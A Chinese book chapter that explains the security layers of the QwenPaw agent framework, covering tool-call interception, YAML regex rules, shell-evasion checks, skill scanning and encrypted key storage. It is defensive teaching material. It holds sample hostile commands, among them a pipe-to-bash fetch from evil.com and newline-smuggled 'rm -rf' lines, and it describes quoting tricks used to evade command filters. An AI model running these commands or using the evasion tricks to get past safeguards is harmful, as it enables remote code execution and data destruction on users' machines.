# 第十三章 Security 的围栏 -- 拦截器与规则引擎

```
浏览器 -> [HTTP/FastAPI] -> Runner -> Agent -> Prompt -> ReAct循环 -> [Tool执行] -> 响应
                                                                               |
                                                                     ToolGuard 安全检查
                                                                        Skill 扫描器
                                                                      密钥加密存储
                                                                           |
                                                                        你在这里
```

## 问题：如果 Agent 想执行 rm -rf /，系统怎么拦住它？

上一章我们拆解了工具执行的完整流程。当大模型通过 Function Calling 协议发出一个 `tool_use` JSON，Agent 不会立刻执行它。在 Agent 和真正的工具函数之间，横着一道安全围栏 -- ToolGuard。

这道围栏看起来像一个简单的"拦截-检查-放行"机制。但如果你翻开 `src/qwenpaw/security/` 目录，会发现它远比想象中复杂：三个守卫者（Guardian）各有分工，一个扫描器（Scanner）专门审查第三方技能，还有一个密钥存储（Secret Store）负责加密 API Key。为什么需要这么多层？因为 Agent 能在用户机器上执行真实的 Shell 命令 -- 如果只靠一道防线，攻破就意味着灾难。

这一章，我们将走进 Security 子系统，看看拦截器模式如何在 QwenPaw 中落地，规则引擎怎样从 YAML 文件加载安全规则，以及纵深防御的理念如何体现在每一行代码中。

---

## 术语其实很简单

> **术语：拦截器模式（Interceptor Pattern）**
> 想象你在高速收费站。不管你开什么车、从哪来、到哪去，都要经过收费亭。收费亭就是一个拦截器 -- 它站在"请求"和"执行"之间，有机会检查、修改甚至拒绝请求。在 QwenPaw 里，`ToolGuardEngine` 就是这个收费亭。每当 Agent 要执行一个工具，请求先经过 ToolGuard 的检查：安全就放行，有风险就拦截。拦截器的好处是，工具本身不需要知道安全检查的存在 -- 它们各管各的，拦截器负责串联。

> **术语：规则引擎（Rule Engine）**
> 想象一本《安检手册》。手册里列着上百条规则："如果行李里有液体超过 100 毫升，就开箱检查"；"如果乘客买了单程票且没带托运行李，就额外盘问"。安检员不需要理解为什么，只需要对照手册逐条检查。规则引擎就是这本手册的数字化版本。在 QwenPaw 里，安全规则写在 YAML 文件中，`RuleBasedToolGuardian` 读取这些规则，把工具参数当作待检行李，逐条做正则匹配。新增规则不需要改代码，只要加一行 YAML。

> **术语：纵深防御（Defense in Depth）**
> 想象一座中世纪城堡。不是一道城墙就完事，而是护城河、外墙、内墙、塔楼、地窖 -- 层层设防。攻破一层，还有下一层。纵深防御的核心思想是：没有任何单一防线是完美可靠的。在 QwenPaw 里，ToolGuard 只是防线之一。文件路径有 `FilePathToolGuardian` 守着，Shell 注入有 `ShellEvasionGuardian` 检测，第三方技能安装前有 `SkillScanner` 扫描，API Key 有 `SecretStore` 加密存储。即使某一条规则被绕过，其他层仍然可以兜底。

---

## 探索：Security 子系统的架构

### 第一层：ToolGuardEngine -- 拦截器的指挥中心

当 Agent 的 `_acting()` 被调用时，请求最先到达的是 `ToolGuardEngine`。它是拦截器模式的编排者 -- 自己不做检查，而是协调一组守卫者（Guardian）来完成。

打开 `src/qwenpaw/security/tool_guard/engine.py`，核心逻辑不到 200 行。`ToolGuardEngine` 的构造函数做了两件事：初始化三个默认守卫者，加载受保护工具和禁止工具的集合。

```python
class ToolGuardEngine:
    def __init__(self, guardians=None, *, enabled=None):
        self._enabled = enabled if enabled is not None else _guard_enabled()
        if guardians is not None:
            self._guardians = list(guardians)
        else:
            self._guardians = self._default_guardians()
        self._reload_tool_sets()
```

默认守卫者有三个：`FilePathToolGuardian`、`RuleBasedToolGuardian`、`ShellEvasionGuardian`。它们共同守护着工具调用的安全。值得注意的是，每个守卫者的初始化都包裹在 try-except 中 -- 即使某个守卫者加载失败（比如配置文件损坏），其他守卫者仍然能正常工作。这是纵深防御的体现：不把鸡蛋放在一个篮子里。

真正执行检查的是 `guard()` 方法。它接收工具名称和参数，遍历所有守卫者，收集它们的安全发现（findings），汇总成一个 `ToolGuardResult`：

```python
def guard(self, tool_name, params, *, only_always_run=False):
    if not self._enabled:
        return None
    result = ToolGuardResult(tool_name=tool_name, params=params)
    for guardian in guardians:
        findings = guardian.guard(tool_name, params)
        result.findings.extend(findings)
    return result
```

这段代码展示了拦截器模式的精髓：Engine 不关心每个 Guardian 内部做了什么，只关心它们返回的结果。新增一个守卫者，只需要实现 `BaseToolGuardian` 接口并注册到 Engine 中，不需要修改 Engine 的任何代码。这叫"开闭原则" -- 对扩展开放，对修改关闭。

### 决策链：从发现到行动

ToolGuardEngine 输出的是一个 `ToolGuardResult`，里面包含所有守卫者的发现。但"发现了问题"不等于"必须拦截"。决策的逻辑在 `_decide_guard_action()` 中，由一个清晰的链条驱动：

```
    ToolGuardResult（包含 findings）
               |
               v
    ┌───────────────────────────┐
    │ 有 CRITICAL/HIGH 发现？    │
    └────┬──────────────┬───────┘
         │              │
        无 │             │ 有
         v              v
       放行          ┌──────────────────┐
    （pass-through） │ max_severity？     │
                    └──┬─────────┬──────┘
                       │         │
              CRITICAL │         │ HIGH
                       v         v
                  自动拒绝     需要审批
                 （auto_denied）（needs_approval）
                              拦截执行，等待人类确认
```

这个决策链的判断依据是 `is_safe` 属性。它的实现很简洁：只有当所有发现的严重程度都不高于 MEDIUM 时，才认为安全：

```python
@property
def is_safe(self) -> bool:
    return not any(
        f.severity in (GuardSeverity.CRITICAL, GuardSeverity.HIGH)
        for f in self.findings
    )
```

严重程度分六级：CRITICAL、HIGH、MEDIUM、LOW、INFO、SAFE。CRITICAL 和 HIGH 会触发拦截，MEDIUM 及以下只做记录。这个分级不是拍脑袋定的，而是每条 YAML 规则都明确标注了严重程度。

### 第二层：RuleBasedToolGuardian -- 规则引擎的核心

三个守卫者中，最复杂的是 `RuleBasedToolGuardian`。它是规则引擎的执行者，负责把 YAML 文件中定义的安全规则加载到内存，然后对工具参数做正则匹配。

规则存储在 `src/qwenpaw/security/tool_guard/rules/dangerous_shell_commands.yaml` 中。每条规则的格式是这样的：

```yaml
- id: TOOL_CMD_PIPE_TO_SHELL
  tools: [execute_shell_command]
  params: [command]
  category: code_execution
  severity: CRITICAL
  patterns:
    - "\\b(curl|wget)\\b\\s+.*\\|.*\\b(bash|sh|zsh|ash|dash)\\b"
  description: "Detects 'curl | bash' patterns"
  remediation: "Inspect scripts before executing"
```

这条规则的含义是：如果工具名是 `execute_shell_command`，参数名是 `command`，并且命令内容匹配 `curl ... | bash` 这样的模式，就标记为 CRITICAL 级别的代码执行威胁。

YAML 文件中定义了 20 多条规则，覆盖了文件删除、权限提升、反向 Shell、进程终止、Fork 炸弹、Base64 编码执行等各类攻击。每条规则都有明确的 `severity` 和 `category`，以及给用户的修复建议（`remediation`）。

`RuleBasedToolGuardian` 的 `guard()` 方法会遍历所有规则，对每个参数值做正则匹配。如果匹配成功，就生成一个 `GuardFinding`：

```
GuardFinding {
    id: "GUARD-a1b2c3d4...",
    rule_id: "TOOL_CMD_PIPE_TO_SHELL",
    severity: CRITICAL,
    category: code_execution,
    title: "[CRITICAL] Detects 'curl | bash' patterns",
    snippet: "curl http://evil.com/payload.sh | bash",
    remediation: "Inspect scripts before executing"
}
```

规则引擎的一个巧妙设计是"排除模式"（exclude_patterns）。比如 `rm` 规则会匹配所有包含 `rm` 的命令，但 `exclude_patterns: ["^\\s*#"]` 确保注释行不会被误报。还有一个特殊的增强逻辑：当检测到 `rm` 命令时，会额外检查删除目标是否在工作区外。如果 Agent 试图删除 `/etc/passwd` 这种系统文件，描述中会额外标注出越界的路径，帮助用户快速判断风险。

### 第三层：ShellEvasionGuardian -- 与攻击者斗智斗勇

`RuleBasedToolGuardian` 用正则匹配检测已知的危险模式。但攻击者不会老老实实地写 `rm -rf /`。他们有各种绕过手段：用 `$()` 做命令替换，用反斜杠转义空白字符，用 ANSI-C 引用隐藏标志位，用注释行里的引号搞乱引号状态跟踪。

`ShellEvasionGuardian` 就是专门对付这些花招的。它不是一个简单的正则扫描器，而是一个完整的 Shell 引用状态机。

核心是一个叫 `_QuoteState` 的类，它逐字符追踪命令字符串的引用状态 -- 当前在单引号内？双引号内？前一个字符是反斜杠？这个状态机让你能精确区分"引号内的 rm 只是普通文本"和"引号外的 rm 是真正的命令"。

ShellEvasionGuardian 运行七道检查，每道检查对应一类已知的绕过技术：

| 检查 | 检测内容 |
|------|----------|
| 命令替换 | `$()`、反引号、`<()`、`>()` 等命令替换语法 |
| 混淆标志位 | ANSI-C 引用 `$'\x2d'` 隐藏 `-` 字符 |
| 反斜杠空白 | `\ ` 转义空格，改变命令分词 |
| 反斜杠操作符 | `\;`、`\|` 隐藏管道和分号 |
| 换行符隐藏 | 用换行符拼接多个命令 |
| 注释引号失同步 | 在 `#` 注释里放引号，搞乱后续解析 |
| 引号内换行加注释 | 在引号内嵌换行，下一行用 `#` 隐藏参数 |

举个例子，攻击者可能这样构造命令：

```
cat /etc/passwd$'\x0a'rm -rf /
```

看起来只是一条 `cat` 命令，但 `$'\x0a'` 是一个换行符。Shell 执行时，`rm -rf /` 成了第二条命令。`_check_command_substitution` 会捕获 `$'` 这个 ANSI-C 引用标记，`_check_obfuscated_flags` 也会报告这个可疑的模式。

### 第四层：FilePathToolGuardian -- 看门狗

三个守卫者中最安静但最执着的是 `FilePathToolGuardian`。它做一件事：检查工具参数中的文件路径是否指向敏感位置。

敏感位置由配置文件中的 `security.file_guard.sensitive_files` 决定。默认情况下，至少包括 QwenPaw 的密钥存储目录（`.qwenpaw.secret`）。如果你试图用 `read_file` 读取这个目录下的文件，Guardian 会立即报告一个 HIGH 级别的发现。

FilePathToolGuardian 的检查范围不限于专门的文件工具。对于 Shell 命令，它会用 `shlex` 解析命令，提取出看起来像文件路径的 token，逐一检查。这意味着 `cat ~/.qwenpaw.secret/master_key` 这样的命令也会被拦截。

一个细节：FilePathToolGuardian 被标记为 `always_run=True`。这意味着即使某个工具不在受保护的范围内（`guarded_tools`），文件路径检查仍然会执行。因为不管工具是什么类型，访问敏感文件始终是高风险行为。

### 审批流：当系统不确定时，交给人类

拦截器做出的决策有三种：直接放行（pass-through）、自动拒绝（auto_denied）、需要审批（needs_approval）。前两种是确定性的 -- 要么没问题，要么明确有危险。第三种最有趣：系统检测到了风险，但不确定这是不是用户真正想要的。

比如 `rm` 命令。删除文件本身是合法操作，但风险很高。系统不会自动拒绝（因为用户可能真的想删除），也不会直接放行（因为可能是大模型幻觉），而是暂停执行，展示检测到的发现，等待用户确认。

`approval.py` 中的 `format_findings_summary()` 负责把发现格式化为人类可读的摘要：

```python
def format_findings_summary(result, *, max_items=3):
    if not result.findings:
        return "No specific risk rules matched."
    lines = []
    for finding in result.findings[:max_items]:
        lines.append(f"- [{finding.severity.value}] {finding.description}")
    remaining = result.findings_count - processed_count
    if remaining > 0:
        lines.append(f"- ... and {remaining} more finding(s) omitted")
    return "\n".join(lines)
```

用户看到的是一个简洁的列表：最多显示前三条发现，多余的折叠。每条发现包含严重程度和描述，帮助用户快速判断"这是不是我想要的"。

### 第五层：SkillScanner -- 安装前的安检

ToolGuard 保护的是工具执行时的安全。但还有一种攻击面：第三方技能（Skill）。用户安装一个别人写的 Skill，这个 Skill 的代码里可能藏着危险 -- 比如读取密钥文件、建立反向 Shell、或者悄悄把环境变量发到远程服务器。

`SkillScanner` 在安装前对技能目录做全面扫描。它的结构和 ToolGuard 类似：一个编排器（`SkillScanner`）管理一组分析器（Analyzer），目前内置的是 `PatternAnalyzer` -- 基于 YAML 签名做正则匹配。

扫描流程分三步：

1. **发现文件** -- 遍历技能目录，跳过二进制文件（图片、字体、压缩包等），跳过符号链接（防止目录穿越攻击），跳过超大文件（默认上限 10 MB），跳过超出文件数量上限的文件（默认 500 个）。

2. **运行分析器** -- 对每个文件运行所有分析器，收集发现。

3. **去重** -- 根据 finding id 去重（如果策略允许）。

文件发现阶段有一个精巧的安全设计：不仅跳过符号链接，还会用 `resolve(strict=True)` 解析每个文件的真实路径，然后检查它是否仍在技能目录内。这是为了防止一种攻击：恶意技能在目录里放一个指向 `/etc/shadow` 的符号链接，如果扫描器不检查真实路径，就可能把系统敏感文件的内容当作技能代码的一部分来读取。

### 第六层：SecretStore -- 密钥的保险箱

API Key、JWT Secret 这些敏感信息不能明文存储在磁盘上。`secret_store.py` 提供了透明的加密/解密层。

加密方案使用 Fernet（AES-128-CBC + HMAC-SHA256），密钥管理有两条路径：

- **首选路径**：操作系统的钥匙串（macOS Keychain、Windows Credential Manager、Linux 的 D-Bus Secret Service），通过 `keyring` 库访问。
- **降级路径**：如果钥匙串不可用（Docker 容器、无头 Linux、CI 环境），就把主密钥写入 `SECRET_DIR/.master_key` 文件，文件权限设为 `0o600`（仅所有者可读写）。

加密后的值以 `ENC:` 前缀开头。这样读取时可以区分密文和明文，实现向后兼容的自动迁移 -- 旧版明文值在第一次被读取时会自动加密，后续读取就是密文了。

主密钥的加载使用了双重检查锁定（double-checked locking），确保多线程环境下只生成一次密钥：

```python
def _get_master_key() -> bytes:
    global _cached_master_key
    if _cached_master_key is not None:
        return _cached_master_key
    with _master_key_lock:
        if _cached_master_key is not None:
            return _cached_master_key
        # 生成或加载主密钥...
```

解析顺序是：内存缓存 -> OS 钥匙串 -> 磁盘文件 -> 首次生成。首次生成时会同时存入钥匙串和磁盘文件，保证两条路径都可用。

#### 加密架构的工程细节

SecretStore 的加密层有几个值得注意的工程细节。

**四级密钥解析链**（`secret_store.py` 第 154 行）按优先级查找主密钥：进程内缓存（无锁快速路径） -> OS 钥匙串（通过 `keyring` 库，服务名 `qwenpaw`） -> 文件 `SECRET_DIR/.master_key`（64 个十六进制字符） -> `secrets.token_hex(32)` 生成新密钥。每一步失败都静默降级到下一步，不会抛出异常。

**加密/解密的幂等性**。`encrypt()` 在加密前检查值是否已经有 `ENC:` 前缀，已加密的值不会重复加密。`decrypt()` 在解密失败时返回原始密文而非抛出异常——这看起来"不安全"，但确保了服务不会因为密钥不匹配而崩溃。

**Provider 配置的透明加密**。`ProviderManager` 在保存 Provider 时通过 `encrypt_dict_fields()` 自动加密 `api_key` 等敏感字段（`secret_store.py` 第 297 行定义了 `PROVIDER_SECRET_FIELDS = frozenset({"api_key"})`），加载时通过 `decrypt_dict_fields()` 透明解密。如果检测到遗留的明文值，`_maybe_migrate_plaintext()` 会在读取时自动重新加密并写回，对调用方完全透明。

**备份恢复的密钥冲突处理**。从备份恢复时，如果备份的 `.master_key` 与当前磁盘上的不同，`handle_master_key_conflict()` 会先把当前密钥备份到 `_pre_restore_keys/` 目录，然后用恢复的密钥覆盖。恢复后调用 `reload_master_key_from_disk()` 使进程内缓存失效并重新同步 OS 钥匙串。

**容器环境的自动检测**。`_should_skip_keyring()` 检测 Docker 容器（`QWENPAW_RUNNING_IN_CONTAINER`）、无 GUI 的 Linux（没有 `DISPLAY` 或 `WAYLAND_DISPLAY`）、CI 环境（`CI=true`），在这些环境中自动跳过 OS 钥匙串，直接使用文件存储。

#### SkillScanner 的威胁分类

SkillScanner 内置的 YAML 签名规则覆盖六类威胁（`rules/signatures/` 目录）：

| 规则类别 | 检测内容 | 严重程度 |
|---------|----------|----------|
| `network_connection` | `requests.`、`urllib.` 等异常网络连接 | 高 |
| `file_write_outside` | 在工作区外写文件 | 高 |
| `subprocess_execute` | `subprocess`、`os.system` 等外部命令执行 | 高 |
| `env_access` | 读取环境变量 | 中 |
| `eval_usage` | 使用 `eval()`/`exec()` | 中 |
| `import_suspicious` | 导入 `socket`、`pty` 等可疑模块 | 中 |

扫描策略由 `ScanPolicy`（`data/default_policy.yaml`）控制，它定义了哪些文件类型被扫描、哪些扩展名被排除。`PatternAnalyzer` 加载 YAML 签名并做正则匹配，结果是 `ScanResult.is_safe` 布尔判定。高严重程度的发现阻止安装，中等程度的发出警告但允许继续。

### 安全全景：所有防线的协作

把所有防线画在一起，QwenPaw 的安全架构是这样的：

```
    用户输入
       |
       v
    ┌──────────────────────────────────────────────────────────┐
    │                    Agent（ReAct 循环）                     │
    │                                                          │
    │  大模型返回 tool_use JSON                                  │
    │       |                                                  │
    │       v                                                  │
    │  ┌─────────────────────────────────────────────────┐     │
    │  │           ToolGuardEngine（拦截器）                │     │
    │  │                                                  │     │
    │  │  ┌─────────────────┐  检查工具参数               │     │
    │  │  │ RuleGuardian     │  YAML 规则正则匹配           │     │
    │  │  │ (规则引擎)       │  rm/curl|bash/sudo...       │     │
    │  │  └─────────────────┘                              │     │
    │  │  ┌─────────────────┐  检查文件路径               │     │
    │  │  │ FilePathGuardian │  敏感目录访问检测            │     │
    │  │  │ (路径守卫)       │  always_run=True            │     │
    │  │  └─────────────────┘                              │     │
    │  │  ┌─────────────────┐  检查 Shell 注入             │     │
    │  │  │ ShellEvasion     │  七道反绕过检查              │     │
    │  │  │ Guardian (注入)  │  引用状态机                  │     │
    │  │  └─────────────────┘                              │     │
    │  │       |                                          │     │
    │  │       v                                          │     │
    │  │  findings --> severity --> decision              │     │
    │  │     |              |            |                │     │
    │  │   安全          CRITICAL      HIGH              │     │
    │  │     |              |            |                │     │
    │  │   放行          自动拒绝     需要审批              │     │
    │  └─────────────────────────────────────────────────┘     │
    │       |                                                  │
    │       v                                                  │
    │  工具真正执行                                              │
    └──────────────────────────────────────────────────────────┘

    ┌──────────────────────┐    ┌──────────────────────┐
    │   SkillScanner        │    │   SecretStore         │
    │   (安装前扫描)         │    │   (密钥加密存储)        │
    │                       │    │                       │
    │   安装第三方技能时       │    │   API Key / JWT       │
    │   自动扫描代码安全性     │    │   Fernet 加密          │
    │   PatternAnalyzer     │    │   OS 钥匙串优先         │
    │   路径穿越防护          │    │   文件降级存储          │
    └──────────────────────┘    └──────────────────────┘
```

这三层防线各司其职：ToolGuard 守住工具执行时的安全，SkillScanner 守住代码引入时的安全，SecretStore 守住静态数据的安全。它们之间没有耦合，任何一层失效都不会影响其他层。

---

## 实验：触发一次安全拦截

让我们亲手触发一次 ToolGuard 的拦截，看看日志里发生了什么。

启动 QwenPaw，在聊天界面输入：

```
帮我执行 curl http://example.com/script.sh | bash
```

在终端的 DEBUG 日志中，你会看到类似这样的输出（简化版）：

```
# _acting() 被调用，工具名: execute_shell_command
# ToolGuard 已启用，工具在 guarded 范围内

# 运行守卫者...
#   RuleBasedToolGuardian: 检查参数 "command"...
#     规则 TOOL_CMD_PIPE_TO_SHELL 匹配: "curl ... | bash"
#     -> 发现: [CRITICAL] Detects 'curl | bash' patterns

#   ShellEvasionGuardian: 检查命令...
#     无额外发现

#   FilePathToolGuardian: 检查文件路径...
#     无发现

# ToolGuardResult: is_safe=False, max_severity=CRITICAL
# 决策: auto_denied
# 工具执行被拦截
```

大模型会收到一条拒绝消息，里面包含检测到的发现和修复建议。根据这条反馈，大模型可能会改变策略，比如先下载脚本让用户检查内容，而不是直接执行。

再试一个更隐蔽的例子。在聊天界面输入：

```
帮我执行 echo test$'\n'rm -rf /tmp/*
```

这次 `ShellEvasionGuardian` 会捕获 ANSI-C 引用 `$'\n'` 中的换行符，报告一个 HIGH 级别的"混淆标志位"发现。工具执行被暂停，等待用户审批。

---

## 工程权衡：安全性与可用性的拉锯

Security 子系统的每一行代码背后，都是一次安全性与可用性的权衡。

**规则引擎的误报问题。** `rm` 规则匹配所有包含 `rm` 的命令。这意味着 `grep "perform" file.txt` 也会触发匹配，因为 `perform` 里有 `rm`。设计者通过正则表达式中的单词边界（`\b`）来缓解这个问题：`\brm\b` 只匹配独立的 `rm` 单词，不匹配嵌入在其他单词中的 `rm`。但误报无法完全消除 -- "确认一下这个 `rm` 是不是你想要的"，总比"悄悄删了你的文件"要好。

**检查开销与用户体验。** 每次工具调用都要跑三个守卫者，每个守卫者要做正则匹配、路径解析。但这些都是纯本地的 CPU 计算，耗时通常在毫秒级。`ToolGuardResult` 里的 `guard_duration_seconds` 字段记录了检查耗时，实际运行中很少超过 10 毫秒。相比于大模型推理动辄数秒的延迟，这个开销可以忽略不计。

**拦截频率与用户耐心。** 如果每执行一个命令都要人工审批，用户很快就会失去耐心。QwenPaw 的策略是分层防护：安全的工具（如 `get_current_time`）完全不需要检查，一般的命令自动通过，只有检测到 CRITICAL 或 HIGH 级别的风险时才拦截。MEDIUM 及以下的发现只做记录，不打断工作流。

**SkillScanner 的文件限制。** 扫描器默认最多处理 500 个文件，每个文件最大 10 MB。这些上限不是技术限制（Python 完全能处理更多），而是实用性权衡。一个正常技能很少有 500 个源码文件。如果超过了，要么是打包方式有问题，要么是夹带了不该夹带的东西。上限的存在本身就是一个信号。

**SecretStore 的降级策略。** OS 钥匙串是最安全的存储方式，但在 Docker 容器和 CI 环境中不可用。降级到文件存储时，安全性降低了（文件可能被备份工具复制、被其他用户读取），但可用性提高了（总能找到一种方式存储密钥）。`_should_skip_keyring()` 通过检测运行环境自动选择存储方式，对使用者完全透明。

---

## 动手：触发一次拦截，阅读拦截日志

这一节的实验不需要写代码。只需要启动 QwenPaw，触发一个会被拦截的命令，然后观察日志。

**第一步：启动 QwenPaw，开启 DEBUG 日志。**

```bash
QWENPAW_LOG_LEVEL=DEBUG qwenpaw serve
```

**第二步：触发一个会被拦截的命令。**

在聊天界面输入：

```
帮我执行 sudo apt update
```

**第三步：在终端日志中寻找以下关键信息。**

1. `ToolGuard 检查` 相关的日志行 -- 确认拦截器被触发
2. `RuleBasedToolGuardian` 的规则匹配结果 -- 应该匹配到 `TOOL_CMD_PRIVILEGE_ESCALATION` 规则（检测 `sudo`）
3. `severity: CRITICAL` -- 确认严重程度
4. 决策结果 -- 应该是 `auto_denied`（自动拒绝）
5. 大模型的后续回复 -- 它会告诉用户无法执行需要提权的命令

**第四步：尝试一个需要审批的命令。**

输入：

```
帮我删除当前目录下的 test.txt 文件
```

观察日志中的 `TOOL_CMD_DANGEROUS_RM` 规则匹配。这次决策应该是 `needs_approval`（需要审批），因为 `rm` 在工作区内执行，风险可控但需要确认。聊天界面会出现等待审批的提示。

**第五步（可选）：查看 YAML 规则文件。**

打开 `src/qwenpaw/security/tool_guard/rules/dangerous_shell_commands.yaml`，浏览其中的规则定义。尝试理解每条规则的 `patterns` 正则表达式在匹配什么类型的攻击。你会对 QwenPaw 的安全覆盖面有更直观的感受。

---

## 小结

这一章我们走进了 QwenPaw 的 Security 子系统，看到了安全围栏的全貌：

1. **ToolGuardEngine** 是拦截器模式的编排中心，协调三个守卫者对工具调用做安全检查，用开闭原则实现可扩展的防护架构
2. **RuleBasedToolGuardian** 是规则引擎的核心，从 YAML 文件加载安全规则，用正则匹配检测各类危险命令
3. **ShellEvasionGuardian** 是一个 Shell 引用状态机，专门检测七类命令混淆和绕过技术
4. **FilePathToolGuardian** 检查文件路径是否指向敏感位置，标记为 `always_run` 确保始终生效
5. **审批流**在系统不确定时把决策权交给人类，平衡了安全性和可用性
6. **SkillScanner** 在安装第三方技能前扫描代码安全性，防护符号链接穿越等攻击
7. **SecretStore** 用 Fernet 加密存储 API Key，优先使用 OS 钥匙串，降级到文件存储时保证可用性
8. 所有防线遵循**纵深防御**理念：多层独立防护，任何单点失效都不会导致整体崩溃

下一章，我们将关注另一个贯穿整个系统的横切关注点：当对话历史越来越长，memory 里堆积了大量消息，大模型的上下文窗口快要装不下时，系统如何做记忆管理与上下文压缩。
